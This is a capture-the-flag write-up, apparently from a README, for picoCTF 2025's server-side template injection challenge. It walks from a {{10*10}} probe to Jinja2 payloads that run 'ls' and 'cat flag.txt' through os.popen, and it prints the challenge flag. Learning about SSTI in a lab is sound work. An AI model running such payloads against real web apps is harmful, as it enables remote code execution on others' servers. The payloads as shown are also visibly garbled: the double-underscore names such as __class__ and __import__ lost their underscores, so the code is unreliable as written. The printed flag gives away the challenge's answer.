## 📌 Project Description

This challenge is part of the **Web Exploitation** category in picoCTF 2025.  
We are given a small web app that lets users post announcements. The description hints at **templating** being used, which suggests potential **Server-Side Template Injection (SSTI)** vulnerabilities.

# Challenge Description

<img width="671" height="591" alt="Screenshot (57)" src="https://github.com/user-attachments/assets/21e47857-ba62-41f1-8059-e553d3b472e5" />


When we open the website, we see a simple input box that allows us to type and display announcements:

# Challenge Website

<img width="1366" height="662" alt="Screenshot (58)" src="https://github.com/user-attachments/assets/e58d41ae-8022-41fd-93a6-621a8bc62b37" />

---

## 🔎 What is Server-Side Template Injection (SSTI)?

Server-Side Template Injection occurs when user input is embedded directly into a server-side template engine (like **Jinja2** in Python, or Twig in PHP) **without proper sanitization**.

- Normally, `{{ variable }}` is used safely to display values inside a template.
- If user input is inserted into the template itself, attackers can inject malicious expressions (e.g., `{{ 10*10 }}`) that are **evaluated by the template engine**.
- This can lead to:
  - Arbitrary data access
  - Remote code execution (e.g., reading files, running OS commands)

In short: SSTI lets us **execute code on the server through template injection**.

---

## 🛠️ Step-by-Step Solution

### 1. Testing for Injection

We start by entering a simple math expression inside the input box:
{{10*10}}

If the site is vulnerable, it will evaluate this and show `100`.  
This confirms **SSTI exists**.

### 2. Exploring the Environment

We can now try to access Python objects. For example:
{{ ''.class.mro[1].subclasses() }}

This lets us explore available classes in the Python environment. From there, we can look for ways to execute system commands.

### 3. Executing System Commands

A well-known trick in Jinja2 SSTI is to use Python’s `__import__` function to load modules. For example:
{{ request.application.globals.builtins.import('os').popen('ls').read() }}


- `__import__('os')` imports the OS module.
- `.popen('ls').read()` lists files on the server.

This gives us access to the file system and we can search for the **flag file**.

### 4. Reading the Flag

Once we see a suspicious file (e.g., `flag.txt`), we can read it:
{{ request.application.globals.builtins.import('os').popen('cat flag.txt').read() }}

This reveals the hidden **picoCTF flag** 🎉.

---

## 🏁 Conclusion

This challenge teaches us:

- How dangerous SSTI vulnerabilities can be.
- How to move from a simple test (`{{10*10}}`) to full remote code execution by chaining Python internals.

**Flag:**  
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}

---

## 🔗 References

- [Jinja2 Template Injection Cheatsheet](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- Inspired by [Mosec0’s picoCTF SSTI1 writeup](https://mosec0.medium.com/picoctf-2025-ssti1-ctf-writeup-a5bf0d4977b5) (paraphrased for simplicity).
  """
